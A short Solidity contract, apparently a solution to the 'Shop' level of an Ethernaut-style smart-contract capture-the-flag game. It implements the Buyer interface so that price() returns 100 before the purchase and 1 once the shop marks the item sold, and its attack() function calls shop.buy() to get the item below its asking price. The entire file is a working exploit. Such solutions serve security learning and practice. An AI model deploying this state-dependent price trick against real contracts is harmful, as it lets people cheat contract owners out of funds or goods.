// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import '../levels/21-Shop.sol';

contract ShopAttacker is Buyer {
    Shop public shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 1 : 100;
    }

    function attack() external {
        shop.buy();
    }
}